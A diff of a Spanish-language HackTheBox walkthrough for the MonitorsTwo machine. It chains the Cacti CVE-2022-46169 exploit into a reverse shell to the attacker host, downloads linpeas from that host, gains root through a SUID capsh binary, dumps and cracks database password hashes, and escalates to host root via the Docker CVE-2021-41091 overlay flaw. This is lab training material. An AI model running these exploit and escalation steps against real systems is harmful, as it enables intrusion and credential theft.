@@ -21,7 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **MonitorsTwo**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.211 -oG allPorts
@@ -45,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.85 seconds
            Raw packets sent: 65548 (2.884MB) | Rcvd: 65554 (2.622MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -58,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.85 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.211 -A -oN targeted -oX targetedXML
@@ -92,30 +94,39 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5011_vmware_loWBmoTuqx.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Foothold
 
+### Cacti 1.2.22 Exploitation - Remote Code Execution \[RCE] (CVE-2022-46169)
+
+Realizaremos una comprobación de las tecnologías que son utilizadas en el sitio web.
 
 ```bash
 ❯ whatweb http://10.10.11.211
 http://10.10.11.211 [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
 ```
 
+Accedemos a http://10.10.11.211 y verificamos que se trata de un panel de inicio de sesión de `Cacti` en la cual se puede verificar que la versión del software es la **1.2.22**.
 
+{% hint style="info" %}
+El sistema de monitero Cacti es un sistema que permite monitorizar cualquier equipo de red que soporte el protocolo SNMP, ya sea un switch, un router o un servidor Linux. Siempre que tengan activado el protocolo SNMP con los distintos OIDs (identificadores de objeto) que podemos monitorizar y visualizar.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (382).png" alt=""><figcaption></figcaption></figure>
 
-
+Buscamos a través de `searchsploit` si existe alguna vulnerabilidad conocida para dicha versión y nos encontramos con el siguiente resultado.
 
 ```bash
 ❯ searchsploit Cacti 1.2.22
@@ -127,19 +138,23 @@ Cacti v1.2.22 - Remote Command Execution (RCE)                                  
 Shellcodes: No Results
 ```
 
-
+Revisando en profundidad sobre la vulnerabilidad reportada anteriormente, nos encontramos con el siguiente `CVE-2022-46169`.
 
 {% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2022-46169" %}
 
 {% hint style="danger" %}
-Cacti es una plataforma de código abierto que proporciona un framework de gestión de fallos y supervisión operativa robusta y extensible para los usuarios. En las versiones afectadas, una vulnerabilidad de inyección de comandos permite a un usuario no autenticado ejecutar código arbitrario en un servidor que ejecuta Cacti, si se seleccionó una fuente de datos específica para cualquier dispositivo monitoreado. La vulnerabilidad reside en el archivo remote\_agent.php. Se puede acceder a este archivo sin autenticación. Esta función recupera la dirección IP del cliente a través de get\_client\_addr y resuelve esta dirección IP en el nombre de host correspondiente a través de gethostbyaddr. Después de esto, se verifica que existe una entrada dentro de la tabla poller, donde el nombre de host corresponde al nombre de host resuelto. Si se encuentra dicha entrada, la función devuelve "verdadero" y el cliente está autorizado. Esta autorización se puede omitir debido a la implementación de la función get\_client\_addr. La función se define en el archivo lib/functions.php y verifica las variables serval $\_SERVER para determinar la dirección IP del cliente. Un atacante puede establecer arbitrariamente las variables que comienzan con HTTP\_. Dado que hay una entrada predeterminada en la tabla poller con el nombre de host del servidor que ejecuta Cacti, un atacante puede omitir la autenticación, por ejemplo, proporcionando el encabezado Forwarded-For: . De esta forma, la función get\_client\_addr devuelve la dirección IP del servidor que ejecuta Cacti. La siguiente llamada a gethostbyaddr resolverá esta dirección IP en el nombre de host del servidor, que pasará la verificación del nombre de host poller debido a la entrada predeterminada. Después de omitir la autorización del archivo remote\_agent.php, un atacante puede desencadenar diferentes acciones. Una de estas acciones se llama "polldata". La función llamada poll\_for\_data recupera algunos parámetros de solicitud y carga las entradas correspondientes de poller\_item de la base de datos. Si la acción de un poller\_item es igual a POLLER\_ACTION\_SCRIPT\_PHP, la función proc\_open se usa para ejecutar un script PHP. El parámetro controlado por el atacante $poller\_id se recupera mediante la función get\_nfilter\_request\_var, que permite cadenas arbitrarias. Esta variable luego se inserta en la cadena pasada a proc\_open, lo que genera una vulnerabilidad de inyección de comando. Por ejemplo, al proporcionar poller\_id=;id, se ejecuta el comando id. Para llegar a la llamada vulnerable, el atacante debe proporcionar un host\_id y un local\_data\_id, donde la acción del poller\_item correspondiente está configurada en POLLER\_ACTION\_SCRIPT\_PHP. Ambos identificadores (host\_id y local\_data\_id) pueden ser fácilmente forzados por fuerza bruta. El único requisito es que exista un poller\_item con una acción POLLER\_ACTION\_SCRIPT\_PHP. Es muy probable que esto ocurra en una instancia productiva porque esta acción se agrega mediante algunas plantillas predefinidas como "Device - Uptimeo "Dispositivo - Polling Time". Esta vulnerabilidad de inyección de comandos permite a un usuario no autenticado ejecutar comandos arbitrarios si se configura unpoller\_itemcon el tipoaction POLLER\_ACTION\_SCRIPT\_PHP (2). La omisión de autorización debe evitarse al no permitir que un atacante haga que get\_client\_addr(archivolib/functions.php) devuelva una dirección IP arbitraria. Esto podría hacerse al no respetar las variables HTTP\_... $\_SERVER. Si se deben conservar por razones de compatibilidad, al menos se debe evitar falsificar la dirección IP del servidor que ejecuta Cacti. Esta vulnerabilidad se ha solucionado en las versiones 1.2.x y 1.3.x, siendo 1.2.23\` la primera versión que contiene el parche.
+Cacti es una plataforma de código abierto que proporciona un framework de gestión de fallos y supervisión operativa robusta y extensible para los usuarios. En las versiones afectadas, una vulnerabilidad de inyección de comandos permite a un usuario no autenticado ejecutar código arbitrario en un servidor que ejecuta Cacti, si se seleccionó una fuente de datos específica para cualquier dispositivo monitoreado. La vulnerabilidad reside en el archivo remote\_agent.php. Se puede acceder a este archivo sin autenticación. Esta función recupera la dirección IP del cliente a través de get\_client\_addr y resuelve esta dirección IP en el nombre de host correspondiente a través de gethostbyaddr. Después de esto, se verifica que existe una entrada dentro de la tabla poller, donde el nombre de host corresponde al nombre de host resuelto. Si se encuentra dicha entrada, la función devuelve "verdadero" y el cliente está autorizado. Esta autorización se puede omitir debido a la implementación de la función get\_client\_addr. La función se define en el archivo lib/functions.php y verifica las variables serval $\_SERVER para determinar la dirección IP del cliente. Un atacante puede establecer arbitrariamente las variables que comienzan con HTTP\_. Dado que hay una entrada predeterminada en la tabla poller con el nombre de host del servidor que ejecuta Cacti, un atacante puede omitir la autenticación, por ejemplo, proporcionando el encabezado Forwarded-For: . De esta forma, la función get\_client\_addr devuelve la dirección IP del servidor que ejecuta Cacti.
+
+La siguiente llamada a gethostbyaddr resolverá esta dirección IP en el nombre de host del servidor, que pasará la verificación del nombre de host poller debido a la entrada predeterminada. Después de omitir la autorización del archivo remote\_agent.php, un atacante puede desencadenar diferentes acciones. Una de estas acciones se llama "polldata". La función llamada poll\_for\_data recupera algunos parámetros de solicitud y carga las entradas correspondientes de poller\_item de la base de datos. Si la acción de un poller\_item es igual a POLLER\_ACTION\_SCRIPT\_PHP, la función proc\_open se usa para ejecutar un script PHP. El parámetro controlado por el atacante $poller\_id se recupera mediante la función get\_nfilter\_request\_var, que permite cadenas arbitrarias. Esta variable luego se inserta en la cadena pasada a proc\_open, lo que genera una vulnerabilidad de inyección de comando. Por ejemplo, al proporcionar poller\_id=;id, se ejecuta el comando id. Para llegar a la llamada vulnerable, el atacante debe proporcionar un host\_id y un local\_data\_id, donde la acción del poller\_item correspondiente está configurada en POLLER\_ACTION\_SCRIPT\_PHP. Ambos identificadores (host\_id y local\_data\_id) pueden ser fácilmente forzados por fuerza bruta. El único requisito es que exista un poller\_item con una acción POLLER\_ACTION\_SCRIPT\_PHP.
+
+Es muy probable que esto ocurra en una instancia productiva porque esta acción se agrega mediante algunas plantillas predefinidas como "Device - Uptimeo "Dispositivo - Polling Time". Esta vulnerabilidad de inyección de comandos permite a un usuario no autenticado ejecutar comandos arbitrarios si se configura unpoller\_itemcon el tipoaction POLLER\_ACTION\_SCRIPT\_PHP (2). La omisión de autorización debe evitarse al no permitir que un atacante haga que get\_client\_addr(archivolib/functions.php) devuelva una dirección IP arbitraria. Esto podría hacerse al no respetar las variables HTTP\_... $\_SERVER. Si se deben conservar por razones de compatibilidad, al menos se debe evitar falsificar la dirección IP del servidor que ejecuta Cacti. Esta vulnerabilidad se ha solucionado en las versiones 1.2.x y 1.3.x, siendo 1.2.23\` la primera versión que contiene el parche.
 {% endhint %}
 
-
+Realizamos una búsqueda básica por Internet y logramos encontrar diferentes repositorios en los cuales parece ser que nos muestran el `exploit`.
 
 <figure><img src="../../.gitbook/assets/imagen (383).png" alt=""><figcaption></figcaption></figure>
 
-
+Nos descargaremos el siguiente repositorio de GitHub.
 
 {% embed url="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22" %}
 
@@ -154,20 +169,14 @@ Recibiendo objetos: 100% (18/18), 5.07 KiB | 5.07 MiB/s, listo.
 Resolviendo deltas: 100% (4/4), listo.
 ```
 
-
-
-
-
-
+Nos ponemos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
-
-
+Ejecutaremos el exploit para proporcionarnos una Reverse Shell hacía el equipo vulnerable.
 
 ```bash
 ❯ python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.3 --LPORT=443
@@ -177,7 +186,7 @@ Bruteforcing the host_id and local_data_ids
 Bruteforce Success!!
 ```
 
-
+Verificamos que nos encontramos en el equipo, pero por lo que parece ser, nos encontramos dentro de un contenedor Docker.
 
 ```bash
 ❯ nc -nlvp 443
@@ -189,7 +198,7 @@ www-data@50bca5e748b0:/var/www/html$ hostname -I
 172.19.0.3 
 ```
 
-
+Realizaremos la siguiente configuración para disponer de una `TTY` interactiva y poder mejorar nuestra experiencia utilizando la terminal.
 
 ```bash
 ❯ nc -nlvp 443
@@ -197,20 +206,29 @@ listening on [any] 443 ...
 connect to [10.10.16.3] from (UNKNOWN) [10.10.11.211] 37662
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
+
 www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash
-script /dev/null -c bash
 Script started, output log file is '/dev/null'.
+
 www-data@50bca5e748b0:/var/www/html$ ^Z
 zsh: suspended  nc -nlvp 443
+
 ❯ stty raw -echo;fg
 [1]  + continued  nc -nlvp 443
                               reset xterm
+                              
 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
 www-data@50bca5e748b0:/var/www/html$ export SHELL=bash
 www-data@50bca5e748b0:/var/www/html$ stty rows 46 columns 230
 ```
 
+## Initial Access
 
+### Capsh SUID Binary Exploitation to gain root access
+
+Nos encontramos con el usuario `www-data` en un contenedor de Docker del equipo víctima. Por lo tanto, realizaremos una enumeración para encontrar alguna vía para elevar nuestros privilegios.
+
+Para ello, haremos uso de `linpeas.sh` el cual compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l linpeas.sh
@@ -219,7 +237,7 @@ www-data@50bca5e748b0:/var/www/html$ stty rows 46 columns 230
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo comprometido, nos descargaremos el binario de `linpeas.sh` y le daremos los permisos correspondientes.
 
 ```bash
 www-data@50bca5e748b0:/tmp$ wget 10.10.16.3/linpeas.sh; chmod +x linpeas.sh
@@ -234,11 +252,11 @@ linpeas.sh                                                100%[=================
 2025-02-16 01:41:12 (2.61 MB/s) - 'linpeas.sh' saved [824942/824942]
 ```
 
-
+Después de ejecutar el escaneo, verificamos que se nos muestra el binario `/sbin/capsh` el cual dispone de privilegios de `SUID`.
 
 <figure><img src="../../.gitbook/assets/5013_vmware_U3fKJGFcKM.png" alt=""><figcaption></figcaption></figure>
 
-
+A través de la herramienta de [searchbins](https://github.com/r1vs3c/searchbins), realizaremos una consulta para verificar la manera de abusar de este binario que tiene privilegios de `SUID` para lograr acceso como `root`.
 
 ```bash
 ❯ searchbins -b capsh -f suid
@@ -251,14 +269,16 @@ linpeas.sh                                                100%[=================
 	| ./capsh --gid=0 --uid=0 --
 ```
 
-
+Realizaremos el comando que se nos indicaba para realizar la explotación, comprobamos finalmente que nos hemos podido convertir en usuario `root` del contenedor de Docker.
 
 ```bash
 www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
 root@50bca5e748b0:/tmp# 
 ```
 
+### SQL Enumeration
 
+Realizando una enumeración de archivos en el directorio `/var/www/html/include`, nos encontramos con el archivo `config.php` el cual contiene las credenciales en texto plano para acceder al `MySQL`.
 
 ```bash
 root@50bca5e748b0:/var/www/html/include# cat config.php 
@@ -304,7 +324,7 @@ $database_ssl_ca   = '';
 $database_persist  = false;
 ```
 
-
+Nos conectaremos al MySQL del hostname `db` y verificaremos las bases de datos que disponemos.
 
 ```bash
 root@50bca5e748b0:/var/www/html/include# mysql -h db -u root -proot
@@ -329,7 +349,7 @@ MySQL [(none)]> SHOW DATABASES;
 5 rows in set (0.004 sec)
 ```
 
-
+Enumeraremos la base de datos nombrada `cacti` en la cual dispone de una tabla llamada `user_auth`.
 
 ```bash
 MySQL [(none)]> USE cacti;
@@ -342,95 +362,9 @@ MySQL [cacti]> SHOW TABLES;
 | Tables_in_cacti                     |
 +-------------------------------------+
 | aggregate_graph_templates           |
-| aggregate_graph_templates_graph     |
-| aggregate_graph_templates_item      |
-| aggregate_graphs                    |
-| aggregate_graphs_graph_item         |
-| aggregate_graphs_items              |
-| automation_devices                  |
-| automation_graph_rule_items         |
-| automation_graph_rules              |
-| automation_ips                      |
-| automation_match_rule_items         |
-| automation_networks                 |
-| automation_processes                |
-| automation_snmp                     |
-| automation_snmp_items               |
-| automation_templates                |
-| automation_tree_rule_items          |
-| automation_tree_rules               |
-| cdef                                |
-| cdef_items                          |
-| color_template_items                |
-| color_templates                     |
-| colors                              |
-| data_debug                          |
-| data_input                          |
-| data_input_data                     |
-| data_input_fields                   |
-| data_local                          |
-| data_source_profiles                |
-| data_source_profiles_cf             |
-| data_source_profiles_rra            |
-| data_source_purge_action            |
-| data_source_purge_temp              |
-| data_source_stats_daily             |
-| data_source_stats_hourly            |
-| data_source_stats_hourly_cache      |
-| data_source_stats_hourly_last       |
-| data_source_stats_monthly           |
-| data_source_stats_weekly            |
-| data_source_stats_yearly            |
-| data_template                       |
-| data_template_data                  |
-| data_template_rrd                   |
-| external_links                      |
-| graph_local                         |
-| graph_template_input                |
-| graph_template_input_defs           |
-| graph_templates                     |
-| graph_templates_gprint              |
-| graph_templates_graph               |
-| graph_templates_item                |
-| graph_tree                          |
-| graph_tree_items                    |
-| host                                |
-| host_graph                          |
-| host_snmp_cache                     |
-| host_snmp_query                     |
-| host_template                       |
-| host_template_graph                 |
-| host_template_snmp_query            |
-| plugin_config                       |
-| plugin_db_changes                   |
-| plugin_hooks                        |
-| plugin_realms                       |
-| poller                              |
-| poller_command                      |
-| poller_data_template_field_mappings |
-| poller_item                         |
-| poller_output                       |
-| poller_output_boost                 |
-| poller_output_boost_local_data_ids  |
-| poller_output_boost_processes       |
-| poller_output_realtime              |
-| poller_reindex                      |
-| poller_resource_cache               |
-| poller_time                         |
-| processes                           |
-| reports                             |
-| reports_items                       |
-| sessions                            |
-| settings                            |
-| settings_tree                       |
-| settings_user                       |
-| settings_user_group                 |
-| sites                               |
-| snmp_query                          |
-| snmp_query_graph                    |
-| snmp_query_graph_rrd                |
-| snmp_query_graph_rrd_sv             |
-| snmp_query_graph_sv                 |
+
+...[snip]...
+
 | snmpagent_cache                     |
 | snmpagent_cache_notifications       |
 | snmpagent_cache_textual_conventions |
@@ -456,7 +390,7 @@ MySQL [cacti]> SHOW TABLES;
 111 rows in set (0.001 sec)
 ```
 
-
+Al revisar el contenido de la tabla `user_auth`, logramos encontrar credenciales en formato hash de diferentes usuarios.
 
 ```bash
 MySQL [cacti]> SELECT * FROM user_auth;
@@ -470,7 +404,7 @@ MySQL [cacti]> SELECT * FROM user_auth;
 3 rows in set (0.000 sec)
 ```
 
-
+A través de `john` logramos crackear el hash de las credenciales del usuario `marcus`.
 
 ```bash
 ❯ hashid '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C'
@@ -478,6 +412,7 @@ Analyzing '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C'
 [+] Blowfish(OpenBSD) 
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt 
+
 ❯ john --wordlist:/usr/share/wordlists/rockyou.txt hashes
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -490,7 +425,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-
+Probamos de autenticarnos con el usuario `marcus` al `SSH` del equipo víctima. Finalmente obtenemos el acceso correspondiente y visualizamos la flag de **user.txt**.
 
 ```bash
 ❯ ssh marcus@10.10.11.211
@@ -503,35 +438,7 @@ Warning: Permanently added '10.10.11.211' (ED25519) to the list of known hosts.
 marcus@10.10.11.211's password: 
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun 16 Feb 2025 01:50:41 AM UTC
-
-  System load:                      0.0
-  Usage of /:                       63.0% of 6.73GB
-  Memory usage:                     16%
-  Swap usage:                       0%
-  Processes:                        237
-  Users logged in:                  0
-  IPv4 address for br-60ea49c21773: 172.18.0.1
-  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
-  IPv4 address for docker0:         172.17.0.1
-  IPv4 address for eth0:            10.10.11.211
-  IPv6 address for eth0:            dead:beef::250:56ff:fe94:bcf5
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
+...[snip]...
 
 You have mail.
 Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
@@ -539,7 +446,11 @@ marcus@monitorstwo:~$ cat user.txt
 292dc7e0693179a7c88e2b1b310bcc31
 ```
 
+## Privilege Escalation
 
+### Docker 20.10.5+dfsg1 Exploitation (CVE-2021-41091)
+
+Revisaremos si el usuario `marcus` dispone de algún grupo o permisos de `sudoers` interesantes, pero no obtenemos resultado.
 
 ```bash
 marcus@monitorstwo:~$ id
@@ -549,11 +460,7 @@ marcus@monitorstwo:~$ sudo -l
 Sorry, user marcus may not run sudo on localhost.
 ```
 
-
-
-<figure><img src="../../.gitbook/assets/5014_vmware_jETpuH9Ke9.png" alt=""><figcaption></figcaption></figure>
-
-
+Después de enumerar diferentes directorios, enumerar el equipo con `linpeas.sh`, etc no logramos obtener resultado. Por lo que decidimos revisar los binarios instalados en el equipo, entre los que se encontraba el de Docker con la siguiente versión.
 
 ```bash
 marcus@monitorstwo:/tmp$ which docker
@@ -562,13 +469,28 @@ marcus@monitorstwo:/tmp$ docker --version
 Docker version 20.10.5+dfsg1, build 55c4c88
 ```
 
+Al realizar una búsqueda por Internet de posibles vulnerabilidades de esa versión de `Docker`, nos encontramos con el siguiente `CVE-2021-41091`.
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2021-41091" %}
+
+{% hint style="danger" %}
+Moby es un proyecto de código abierto creado por Docker para permitir la contención de software. Se encontró un error en Moby (Docker Engine) en el que el directorio de datos (normalmente "/var/lib/docker") contenía subdirectorios con permisos insuficientemente restringidos, lo que permitía a usuarios de Linux no privilegiados saltar el contenido del directorio y ejecutar programas. Cuando los contenedores incluían programas ejecutables con bits de permiso extendidos (como "setuid"), los usuarios no privilegiados de Linux podían detectar y ejecutar esos programas. Cuando el UID de un usuario de Linux no privilegiados en el host colisionaba con el propietario o el grupo de un archivo dentro de un contenedor, el usuario de Linux no privilegiados en el host podía descubrir, leer y modificar esos archivos. Este bug ha sido corregido en Moby (Docker Engine) versión 20.10.9. Usuarios deberían actualizar a esta versión lo antes posible. Los contenedores en ejecución deben ser detenidos y reiniciados para que los permisos sean corregidos. Para usuarios que no puedan actualizar, limite el acceso al host a usuarios confiables. Limite el acceso a los volúmenes del host a los contenedores confiables
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (384).png" alt=""><figcaption></figcaption></figure>
 
+Al intentar enumerar si había algún contenedor en ejecución con el comando `docker ps`, nos devolvió un mensaje de error de acceso denegado.
 
+Por lo tanto, decidimos revisar a través del comando `mount` de revisar los puntos de montaje de Docker. Finalmente, comprobamos dos `overlay` que podrían ser los contenedores en ejecución.
 
 ```bash
+overlay on /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/overlay2/l/3JPYTR54WWK2EX6DJ7PMMAVPQQ:/var/lib/docker/overlay2/l/YWET34PNBXR53LJY2XX7ZIXHLS:/var/lib/docker/overlay2/l/IM3MC55GS7JDB4D2EYTLAZAYLJ:/var/lib/docker/overlay2/l/6TLSBQSLTGP74QVFJVO2GOHLHL:/var/lib/docker/overlay2/l/OOXBDBKU7L25J3XQWTXLGRF5VQ:/var/lib/docker/overlay2/l/FDT56KIETI2PMNR3HGWAZ3GIGS:/var/lib/docker/overlay2/l/JE6MIEIU6ONHIWNBG36DJGDNEY:/var/lib/docker/overlay2/l/IAY73KSFENK4CC5DX5L2HCRFQJ:/var/lib/docker/overlay2/l/UDDRFLWFZYH6I5EUDCDWCOPSZX:/var/lib/docker/overlay2/l/5MM772DWMOBQZAEA4J34QYSZII,upperdir=/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/diff,workdir=/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/work,xino=off)
+overlay on /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)
+```
+
+```bash
+marcus@monitorstwo:~$ docker ps
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
 marcus@monitorstwo:/var/lib/docker$ mount
 sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
 proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
@@ -612,7 +534,7 @@ tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=402608k,mode=7
 binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
 ```
 
-
+Al revisar el contenido de ambos contenedores, nos encontramos que al parecer el segundo es el de `cacti`, el cual teníamos acceso como usuario `root`.
 
 ```bash
 marcus@monitorstwo:/var/lib/docker$ ls /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
@@ -637,7 +559,7 @@ automation_templates.php    cmd_realtime.php           gprint_presets.php       
 marcus@monitorstwo:/var/lib/docker$ 
 ```
 
-
+Probaremos de verificar si la vulnerabilidad está presente, crearemos un nuevo archivo `gzzcoo.txt` en el directorio `/tmp` del contenedor de Docker. Al crear dicho archivo, verificamos que posteriormente lo podemos visualizar accediendo a él.
 
 ```bash
 marcus@monitorstwo:/var/lib/docker$ echo 'gzzcoo' > /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/gzzcoo.txt
@@ -645,7 +567,7 @@ marcus@monitorstwo:/var/lib/docker$ cat /var/lib/docker/overlay2/c41d5854e43bd99
 gzzcoo
 ```
 
-
+Por lo tanto, para poder aprovecharnos de esta vulnerabilidad, lo que realizaremos es darle permisos de `SUID` al binario `/bin/bash` del contenedor de Dcoker el cual obtuvims anteriormente acceso como `root`.
 
 ```bash
 root@50bca5e748b0:/# ls -l /bin/bash
@@ -655,7 +577,9 @@ root@50bca5e748b0:/# ls -l /bin/bash
 -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
 ```
 
+Una vez asignado los permisos correspondientes, ejecutaremos el `/bin/bash` accediendo directamente desde `/var/lib/docker/overlay2`. Verificamos que finalmente nos hemos convertido en usuario `root` en el equipo objetivo y no en el de Docker.
 
+Logramos obtener finalmente la flag de **root.txt**.
 
 ```bash
 marcus@monitorstwo:/var/lib/docker$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
@@ -664,12 +588,16 @@ root
 bash-5.1# hostname -I
 10.10.11.211 172.17.0.1 172.18.0.1 172.19.0.1 dead:beef::250:56ff:fe94:bcf5 
 bash-5.1# cat /root/root.txt 
-cb9953909edef30d40d8594b834c7153
+cb9953909ed0000000000000000000000
 ```
 
+Por otro lado, nos encontramos con el siguiente exploit en Bash que nos guiaba en la explotación, ya que está realizado de una manera más automatizada.
 
+{% embed url="https://github.com/UncleJ4ck/CVE-2021-41091" %}
 
-{% embed url="https://github.com/UncleJ4ck/CVE-2021-41091%C3%A7" %}
+Al ejecutar el exploit, se nos indica que le hayamos otorgado el `setuid` al `/bin/bash` del contenedor de Docker. Una vez realizada esta verificación, se nos indicará el `Vulnerable Path` y cómo abusar de esta vulnerabilidad.
+
+Ejecutaremos la `bash`modificada del contenedor de Docker y logramos obtener el acceso como usuario `root` en el sistema objetivo y no el contenedor de Docker.
 
 ```bash
 marcus@monitorstwo:/tmp$ ./exploit.sh 
@@ -697,5 +625,5 @@ marcus@monitorstwo:/tmp$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b
 bash-5.1# whoami
 root
 bash-5.1# cat /root/root.txt 
-cb9953909edef30d40d8594b834c7153
+cb9953909ed*************************
 ```
